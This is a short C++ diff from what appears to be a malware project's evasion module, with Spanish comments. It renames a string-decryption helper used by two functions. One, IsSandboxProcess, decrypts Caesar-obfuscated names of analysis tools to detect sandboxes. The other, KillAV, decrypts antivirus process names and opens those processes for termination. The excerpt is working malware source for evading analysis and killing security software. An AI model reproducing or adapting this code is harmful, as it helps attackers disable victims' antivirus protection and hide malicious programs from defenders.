@@ -1,5 +1,5 @@
 #include "evasion\Sandbox.h"
-#include "Crypt.h"
+#include "Obfuscator.h"
 
 Sandbox::Sandbox() {};
 
@@ -118,7 +118,7 @@ BOOL Sandbox::IsSandboxProcess() {
 
     for (std::vector<unsigned char>& toolBytes : analysisTools) {
         // Desencriptamos el nombre del proceso utilizando decryptCaesar
-        std::string toolName = Crypt::decryptCaesar(toolBytes, 0xDE);
+        std::string toolName = Obfuscator::DecryptCaesar(toolBytes, 0xDE);
 
         // Obtener el Process ID del proceso si está corriendo
         HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetProcessIdByName(toolName));
@@ -143,7 +143,7 @@ VOID Sandbox::KillAV() {
     };
 
     for (std::vector<unsigned char>& avBytes : avProcesses) {
-        std::string avName = Crypt::decryptCaesar(avBytes, 0xDE);
+        std::string avName = Obfuscator::DecryptCaesar(avBytes, 0xDE);
 
         HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, GetProcessIdByName(avName));
         if (hProcess != NULL) {
